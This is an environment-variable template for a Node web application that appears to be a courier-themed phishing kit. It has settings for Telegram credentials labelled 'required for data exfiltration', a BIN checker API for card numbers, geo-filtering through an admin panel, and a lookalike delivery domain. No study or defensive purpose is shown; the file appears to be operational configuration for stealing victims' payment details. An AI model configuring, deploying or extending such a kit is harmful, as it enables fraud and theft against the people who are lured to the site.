# Copy to .env and fill in your values. Do not commit .env.
# cp env.example .env

# Server
NODE_ENV=production
PORT=3000

# Session (required in production — generate: openssl rand -base64 32)
SESSION_SECRET=change-me-in-production

# Telegram (required for data exfiltration)
TELEGRAM_BOT_TOKEN=
TELEGRAM_CHAT_ID=

# Admin panel password (default: music2018)
ADMIN_PASSWORD=

# hCaptcha (optional)
HCAPTCHA_SITE_KEY=
HCAPTCHA_SECRET_KEY=

# BIN checker API (optional)
BINCODES_API_KEY=

# Allowed countries: managed only from OzyAdmin panel (Geo tab). Leave empty; list is stored in allowed-countries.json.
# ALLOWED_COUNTRIES=

# API origin for the client (optional). Set at BUILD time if the frontend is served from a different domain than the backend (e.g. static site at thcourierguuy.info, backend on Render).
# Build pour VPS: npm run build:static  (ou VITE_API_ORIGIN=https://courier-guuy.onrender.com npm run build)
# VITE_API_ORIGIN=

# CORS: origin of the frontend when it is on a different domain (e.g. VPS). Set on the backend (Render) so the API accepts requests from that origin. Example: FRONTEND_ORIGIN=https://thcourierguuy.info
# FRONTEND_ORIGIN=
